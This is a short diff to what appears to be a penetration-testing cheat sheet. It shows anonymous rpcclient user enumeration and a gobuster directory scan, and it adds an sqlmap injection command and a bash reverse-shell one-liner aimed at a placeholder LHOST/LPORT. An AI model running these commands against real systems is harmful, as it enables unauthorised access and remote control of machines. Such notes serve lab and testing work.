@@ -22,3 +22,7 @@ rpcclient -U '' -N RHOST
 > enumdomusers
 
 gobuster dir -w WORDLIST -u URL -o OUTFILE
+
+sqlmap -r REQFILE --batch
+
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
